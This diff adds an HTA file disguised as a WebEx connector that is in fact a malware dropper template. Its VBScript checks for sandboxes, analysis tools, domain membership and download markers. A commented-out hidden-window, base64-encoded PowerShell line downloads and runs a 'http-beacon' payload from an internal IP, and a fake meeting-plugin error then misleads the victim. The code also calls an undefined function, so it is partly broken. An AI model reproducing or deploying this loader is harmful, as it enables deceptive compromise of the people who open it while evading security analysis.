@@ -1,0 +1,108 @@
+<html>
+<head>
+<title>WebEx Connector</title>
+<HTA:APPLICATION  ID="webexconnector" APPLICATIONNAME="WebExConnector" />
+</head>
+<script language="VBScript">
+				Function checkZoneIdentifier()
+			Set fso = CreateObject("Scripting.FileSystemObject")
+			fullPath = fso.GetAbsolutePathName("..\..")
+			If fso.FileExists(fullPath & ":Zone.Identifier") Then
+				checkZoneIdentifier = True
+			Else
+				checkZoneIdentifier = False
+			End If    
+		End Function
+
+		Function checkPartOfDomain()
+			partOfDomain = False
+			Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+			Set colItems = objWMIService.ExecQuery("Select * from Win32_ComputerSystem", , 48)
+			
+			For Each objItem In colItems
+				If objItem.partOfDomain Then
+					partOfDomain = True
+				End If
+			Next
+
+			If partOfDomain Then
+				checkPartOfDomain = True
+			Else
+				checkPartOfDomain = False
+			End If
+		End Function
+
+		Function checkUsername()
+			badUsername = False
+			badUsernames = Array("admin", "malfind", "sandbox", "test")
+			
+			Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+			Set colItems = objWMIService.ExecQuery("Select * from Win32_ComputerSystem", , 48)
+			
+			For Each objItem In colItems
+				For Each badName In badUsernames
+					If InStr(LCase(objItem.UserName), badName) > 0 Then
+						badUsername = True
+					End If
+				Next   
+			Next
+
+			If badUsername Then 
+				checkUsername = False
+			Else
+				checkUsername = True
+			End If
+		End Function
+
+		Function checkProcs()
+			badTask = False
+			badTaskNames = Array("tcpview", "wireshark", "fiddler", "procexp")
+			
+			Set objWMIService = GetObject("winmgmts:\\.\root\cimv2") 
+			Set colProcess = objWMIService.ExecQuery("Select * from Win32_Process")
+
+			For Each objProcess in colProcess
+				For Each badTaskName In badTaskNames
+					If InStr(LCase(objProcess.Name), badTaskName) > 0 Then
+						badTask = True
+					End If
+				Next
+			Next
+
+			If badTask Then
+				checkProcs = False
+			Else
+				checkProcs = True
+			End If    
+		End Function
+
+		cZI = checkZoneIdentifier()
+		cP = checkProcs()
+		cU = checkUsername()
+		cPD = checkPartOfDomain()
+		cN=checkMachineName()
+
+		if not (cZI and cP and cU and cPD) Then
+			o = "This seems suspicious!"
+			if cP Then o = o & vbCrLf  & "[+] Processes" Else o = o & vbCrLf  & "[ ! ] Processes"
+			if cU Then o = o & vbCrLf  & "[+] Username" Else o = o & vbCrLf  & "[ ! ] Username"
+			if cPD Then o = o & vbCrLf  & "[+] Domain" Else o = o & vbCrLf  & "[ ! ] Domain"
+			if cZI Then o = o & vbCrLf  & "[+] Zone ID" Else o = o & vbCrLf  & "[ ! ] Zone ID"
+			if cN Then o = o & vbCrLf  & "[+] Name" Else o = o & vbCrLf  & "[ ! ] Name"
+			MsgBox o
+			self.close
+		Else
+			' Put existing code here '
+		End If
+        'powershell -Sta -Nop -Window Hidden -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADAALgAxADAAOgA5ADAAOQAwAC8AaAB0AHQAcAAtAGIAZQBhAGMAbwBuACcAKQApAA=='
+
+        MsgBox "Unable to load Meeting. ERROR: 'plugin_not_installed'", vbOk+vbCritical, "Error connecting to meeting"
+        self.close
+
+</script>
+<body>
+<H1>WebEx Connector</H1>
+</body>
+</html>
+
+
